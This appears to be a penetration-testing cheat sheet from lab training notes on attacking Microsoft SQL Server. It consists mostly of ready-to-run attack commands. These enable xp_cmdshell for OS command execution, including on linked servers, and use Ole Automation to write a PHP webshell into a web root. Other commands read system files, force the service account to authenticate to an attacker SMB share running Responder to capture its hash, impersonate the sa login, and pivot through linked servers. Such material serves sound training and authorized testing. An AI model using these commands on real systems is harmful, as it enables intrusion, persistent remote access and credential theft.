#### MSSQL Default Databases
- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.

## Syntax
#### Show Databases
```SQL
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```
#### Select a Database
```SQL
1> USE htbusers
2> GO
```
#### Show Tables
```SQL
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO
```
#### Select all Data from Table "users"
```SQL
1> SELECT * FROM users
2> GO
```

## Execute Commands
#### XP_CMDSHELL
```SQL
1> xp_cmdshell 'whoami'
2> GO
```
#### Enable XP_CMDSHELL if Disabled
```SQL
-- To allow advanced options to be changed.
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options. 
RECONFIGURE
GO

-- To enable the feature. 
EXECUTE sp_configure 'xp_cmdshell', 1
GO 

-- To update the currently configured value for this feature.
RECONFIGURE
GO
```

**On A Linked Server**:
```SQL
EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV];
```

--

`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys).

--
## Write Local Files
To write files using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:
#### MSSQL - Enable Ole Automation Procedures
```SQL
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```
#### MSSQL - Create a File
Here we open a file and write a php webshell.
```SQL
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

## Read Local Files
By default, `MSSQL` allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:
#### Read Local Files in MSSQL
```shell
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

## Capture MSSQL Service Hash
We can steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.
#### Set up Responder
```shell
responder -I tun0
```

#### Trigger authentication to our SMB Server
```SQL
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO
```
OR
```SQL
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

## Impersonate Existing Users with MSSQL
SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.

#### Identify Users that We Can Impersonate
Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned.
```SQL
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin
```
#### Verifying our Current User and Role
```SQL
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio

0        
```
As the returned value `0` indicates, we do not have the sysadmin role, but we can impersonate the `sa` user as we can see above.
#### Impersonating the SA User
```SQL
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```
**Note:** It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database.
**Note:** If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.

## Communicate with Other Databases with MSSQL
Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we may be able to move laterally to that database server.
#### Identify linked Servers in MSSQL
```SQL
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0
```
As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server.
#### Identify User and Privilege
```SQL
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote 
```
As we have seen, we can now execute queries with sysadmin privileges on the linked server. As `sysadmin`, we control the SQL Server instance. We can read data from any database or execute system commands with `xp_cmdshell`.
## Nice Cheatsheet
https://hackviser.com/tactics/pentesting/services/mssql